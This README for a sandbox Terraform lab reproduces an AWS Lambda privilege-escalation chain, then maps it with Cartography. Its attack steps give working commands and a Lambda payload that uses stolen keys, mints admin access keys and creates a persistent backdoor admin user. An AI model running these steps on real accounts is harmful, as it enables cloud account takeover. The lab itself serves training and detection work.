# Sysdig AWS Lambda Privesc: Reproduction Lab

A minimal Terraform setup that reproduces the privilege-escalation primitive from Sysdig's November 2025 cloud intrusion report. Deploys a deliberately vulnerable AWS account with a public S3 bucket containing IAM credentials, an over-permissioned Lambda execution role, and an exploitable user-to-Lambda permission path.

> **Sandbox accounts only.** This provisions live AWS credentials in a publicly readable bucket. Never deploy in a production or shared account.

## Prerequisites

- AWS sandbox account with an admin IAM user
- AWS CLI v2 (`aws configure` with admin credentials, region `us-east-1`)
- Terraform ≥ 1.5
- `jq` (for parsing the attack response)
- Docker or Podman (for Neo4j, used by Cartography)
- Python 3.11 or 3.12 (Python 3.14 is incompatible with Cartography's asyncio code)

## Setup

```bash
git clone <repo-url>
cd sysdig-sim
terraform init
terraform apply       # type 'yes'
```

Provisioning takes about a minute. The outputs include the bucket name and the public credentials URL.

Confirm the initial-access vector works:

```bash
unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_PROFILE
curl -s $(terraform output -raw public_creds_url)
```

You should see a valid AWS access-key pair printed in plaintext.

## Running the Attack

**1. Configure the attacker profile** with the stolen credentials:

```bash
aws configure --profile attacker      # paste the stolen keys
aws --profile attacker sts get-caller-identity
# Should return: ...user/compromised_user
```

**2. Build the malicious payload:**

```bash
mkdir -p payload
cat > payload/index.py <<'EOF'
import boto3, json

def lambda_handler(event, context):
    iam = boto3.client('iam')
    try:
        key = iam.create_access_key(UserName='frick')
        return {
            'statusCode': 200,
            'body': json.dumps({
                'AccessKeyId': key['AccessKey']['AccessKeyId'],
                'SecretAccessKey': key['AccessKey']['SecretAccessKey'],
            })
        }
    except Exception as e:
        return {'statusCode': 500, 'body': str(e)}
EOF

cd payload && zip -r ../payload.zip index.py && cd ..
```

**3. Inject and invoke:**

```bash
export AWS_PAGER=""

aws --profile attacker lambda update-function-code \
  --function-name EC2-init \
  --zip-file fileb://payload.zip

# Wait ~10 seconds for the update to finalize
aws --profile attacker lambda invoke \
  --function-name EC2-init \
  --cli-binary-format raw-in-base64-out \
  /tmp/lambda-output.json

cat /tmp/lambda-output.json | jq -r '.body | fromjson'
```

The response contains a freshly-minted access-key pair for the admin user `frick`.

**4. Establish persistence** by creating a backdoor admin user with `frick`'s new keys:

```bash
aws configure --profile pwned          # paste frick's keys
aws --profile pwned iam create-user --user-name backdoor-admin
aws --profile pwned iam attach-user-policy \
  --user-name backdoor-admin \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
aws --profile pwned iam create-access-key --user-name backdoor-admin
```

End state: three compromised identities (`compromised_user`, `frick`, `backdoor-admin`), one of which exists entirely outside Terraform state.

## Graph Analysis with Cartography

**1. Start a local Neo4j 5 container:**

```bash
docker run -d \
  --name cartography-neo4j \
  -p 7474:7474 -p 7687:7687 \
  -e NEO4J_AUTH=none \
  -e NEO4J_PLUGINS='["apoc"]' \
  neo4j:5.26-community
```

Neo4j 5.23 or later is required — Cartography emits Cypher subquery syntax that older versions reject.

**2. Install Cartography in a Python 3.12 venv:**

```bash
python3.12 -m venv .venv
source .venv/bin/activate
pip install --upgrade pip
pip install cartography
```

**3. Run the sync** using your admin AWS profile (not the attacker profile — Cartography needs broad read access):

```bash
export AWS_PROFILE=default

cartography --neo4j-uri bolt://localhost:7687 \
  --selected-modules aws \
  --aws-requested-syncs "iam,lambda_function,s3" \
  --aws-regions us-east-1
```

The restricted flags keep the graph small and the sync fast (~30 seconds). Removing them ingests all AWS services across all enabled regions, which produces a much noisier graph.

**4. Explore the graph** at <http://localhost:7474> (no login, auth is disabled). The minimal case-relevant query:

```cypher
MATCH path = (anchor)-[*0..2]-(neighbor)
WHERE (anchor.name IN ['compromised_user', 'frick', 'backdoor-admin',
                       'EC2-init', 'EC2-init-exec-role']
       OR (anchor:S3Bucket AND coalesce(anchor.name,'') STARTS WITH 'rag-data-'))
  AND ALL(node IN nodes(path) WHERE 
        NOT node:AWSAccount 
        AND NOT coalesce(node.arn,'') CONTAINS 'foundation-model')
RETURN path
```

Excluding `AWSAccount` from path traversal prevents the result from exploding through the account-hub edge. The rendered subgraph shows the privesc-relevant entities — users, policies, statements, Lambda, execution role — without the rest of the account's resources.

If you re-run Cartography after the attack, `backdoor-admin` appears in the graph alongside the other users, since Cartography reflects live cloud state rather than Terraform state.

## Cleanup

```bash
# Delete the backdoor user (Terraform doesn't track it)
aws iam list-access-keys --user-name backdoor-admin \
  --query 'AccessKeyMetadata[].AccessKeyId' --output text | \
  xargs -n 1 aws iam delete-access-key --user-name backdoor-admin --access-key-id
aws iam detach-user-policy --user-name backdoor-admin \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
aws iam delete-user --user-name backdoor-admin

# Delete the attacker-minted keys on frick
aws iam list-access-keys --user-name frick \
  --query 'AccessKeyMetadata[].AccessKeyId' --output text | \
  xargs -n 1 aws iam delete-access-key --user-name frick --access-key-id

# Tear down the AWS infrastructure
terraform destroy

# Stop the Neo4j container
docker rm -f cartography-neo4j

# Remove the stale AWS profiles
# Open ~/.aws/credentials and ~/.aws/config in your editor
# and delete the [attacker] and [pwned] blocks
```

If you didn't complete the persistence step (4) of the attack, the `backdoor-admin` and `frick` access-key cleanups will fail with `NoSuchEntity` — that's expected and harmless. Skip them and run `terraform destroy` directly.

## Repository Structure

```
sysdig-sim/
├── README.md
├── providers.tf       # Terraform + AWS provider config
├── users.tf           # IAM users: compromised_user, frick
├── lambda.tf          # Lambda + over-permissioned execution role
├── s3.tf              # Public S3 bucket exposing credentials
└── outputs.tf         # Bucket name + public URL
```

## Reference

Sysdig Threat Research Team, *AI-assisted cloud intrusion achieves admin access in 8 minutes* (Feb 2026): <https://www.sysdig.com/blog/ai-assisted-cloud-intrusion-achieves-admin-access-in-8-minutes>